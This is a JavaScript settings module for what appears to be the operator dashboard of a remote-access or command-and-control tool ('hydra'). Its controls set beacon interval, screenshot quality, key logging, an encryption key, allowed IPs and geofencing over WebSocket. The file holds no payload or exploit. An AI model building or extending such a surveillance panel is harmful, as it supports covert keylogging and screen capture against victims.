// Settings Module
const Settings = {
    socket: null,
    currentSettings: {},

    init(socket) {
        this.socket = socket;
        console.log('Settings initialized with socket');
        this.setupEventListeners();
        this.loadSettings();
    },

    setupEventListeners() {
        try {
            // Settings form
            const settingsForm = document.getElementById('settings-form');
            if (settingsForm) {
                settingsForm.addEventListener('submit', (e) => {
                    e.preventDefault();
                    this.saveSettings();
                });
            }

            // Security form
            const securityForm = document.getElementById('security-form');
            if (securityForm) {
                securityForm.addEventListener('submit', (e) => {
                    e.preventDefault();
                    this.saveSecuritySettings();
                });
            }

            // Use custom event for WebSocket messages
            document.addEventListener('socket-message', (event) => {
                const message = event.detail;
                if (message.type === 'settings') {
                    this.handleSettings(message);
                } else if (message.type === 'settings_updated') {
                    this.handleSettingsUpdated(message);
                } else if (message.type === 'security_settings_updated') {
                    this.handleSecuritySettingsUpdated(message);
                }
            });
            
            console.log('Settings event listeners set up');
        } catch (error) {
            console.error('Error setting up Settings event listeners:', error);
        }
    },

    loadSettings() {
        if (WebSocketManager && WebSocketManager.send) {
            WebSocketManager.send({
                type: 'get_settings'
            });
        } else {
            console.error('WebSocketManager not available in Settings module');
        }
    },

    handleSettings(data) {
        if (!data.settings) {
            console.error('No settings data received');
            return;
        }
        
        this.currentSettings = data.settings;
        this.updateSettingsForm();
    },

    updateSettingsForm() {
        try {
            // General settings
            const beaconInterval = document.getElementById('beacon-interval');
            const screenshotQuality = document.getElementById('screenshot-quality');
            const keyLogging = document.getElementById('key-logging');
            
            if (beaconInterval) {
                beaconInterval.value = this.currentSettings.beacon_interval || 60;
            }
            
            if (screenshotQuality) {
                screenshotQuality.value = this.currentSettings.screenshot_quality || 'medium';
            }
            
            if (keyLogging) {
                keyLogging.checked = this.currentSettings.key_logging || false;
            }
        } catch (error) {
            console.error('Error updating settings form:', error);
        }
    },

    saveSettings() {
        try {
            const beaconInterval = document.getElementById('beacon-interval');
            const screenshotQuality = document.getElementById('screenshot-quality');
            const keyLogging = document.getElementById('key-logging');
            
            if (!beaconInterval || !screenshotQuality || !keyLogging) {
                console.error('Settings form elements not found');
                return;
            }
            
            const settings = {
                beacon_interval: parseInt(beaconInterval.value),
                screenshot_quality: screenshotQuality.value,
                key_logging: keyLogging.checked
            };

            if (WebSocketManager && WebSocketManager.send) {
                WebSocketManager.send({
                    type: 'update_settings',
                    settings: settings
                });
            }
        } catch (error) {
            console.error('Error saving settings:', error);
            dashboard.showNotification('Error saving settings', 'danger');
        }
    },

    handleSettingsUpdated(data) {
        if (data.success) {
            dashboard.showNotification('Settings updated successfully', 'success');
            if (data.settings) {
                this.currentSettings = data.settings;
            }
        } else {
            dashboard.showNotification('Failed to update settings: ' + (data.error || 'Unknown error'), 'danger');
        }
    },

    saveSecuritySettings() {
        try {
            const encryptionKey = document.getElementById('encryption-key');
            const allowedIPs = document.getElementById('allowed-ips');
            const geofencing = document.getElementById('geofencing');
            
            if (!encryptionKey || !allowedIPs || !geofencing) {
                console.error('Security settings form elements not found');
                return;
            }
            
            const settings = {
                encryption_key: encryptionKey.value,
                allowed_ips: allowedIPs.value.split('\n').filter(ip => ip.trim()),
                geofencing: geofencing.checked
            };

            if (WebSocketManager && WebSocketManager.send) {
                WebSocketManager.send({
                    type: 'update_security_settings',
                    settings: settings
                });
            }
        } catch (error) {
            console.error('Error saving security settings:', error);
            dashboard.showNotification('Error saving security settings', 'danger');
        }
    },

    handleSecuritySettingsUpdated(data) {
        if (data.success) {
            dashboard.showNotification('Security settings updated successfully', 'success');
            // Clear sensitive fields
            const encryptionKey = document.getElementById('encryption-key');
            if (encryptionKey) {
                encryptionKey.value = '';
            }
        } else {
            dashboard.showNotification('Failed to update security settings: ' + (data.error || 'Unknown error'), 'danger');
        }
    },

    // Theme settings
    setTheme(theme) {
        document.body.classList.remove('dark-theme');
        if (theme === 'dark') {
            document.body.classList.add('dark-theme');
        }
        localStorage.setItem('theme', theme);
        dashboard.showNotification(`Theme changed to ${theme}`, 'info');
    },

    // Export settings
    exportSettings() {
        try {
            const settings = {
                general: this.currentSettings,
                security: {
                    allowed_ips: document.getElementById('allowed-ips').value.split('\n').filter(ip => ip.trim()),
                    geofencing: document.getElementById('geofencing').checked
                }
            };

            const blob = new Blob([JSON.stringify(settings, null, 2)], { type: 'application/json' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'hydra_settings.json';
            a.click();
            window.URL.revokeObjectURL(url);
        } catch (error) {
            console.error('Error exporting settings:', error);
            dashboard.showNotification('Error exporting settings', 'danger');
        }
    },

    // Import settings
    importSettings(file) {
        if (!file) {
            dashboard.showNotification('No file selected', 'warning');
            return;
        }
        
        const reader = new FileReader();
        reader.onload = (e) => {
            try {
                const settings = JSON.parse(e.target.result);
                if (WebSocketManager && WebSocketManager.send) {
                    WebSocketManager.send({
                        type: 'import_settings',
                        settings: settings
                    });
                }
            } catch (error) {
                console.error('Error parsing settings file:', error);
                dashboard.showNotification('Invalid settings file format', 'danger');
            }
        };
        reader.readAsText(file);
    }
};

// Remove the duplicate initialization since WebSocketManager now handles this
document.addEventListener('DOMContentLoaded', () => {
    // WebSocketManager will initialize this module
    console.log('Settings waiting for WebSocketManager initialization');
}); 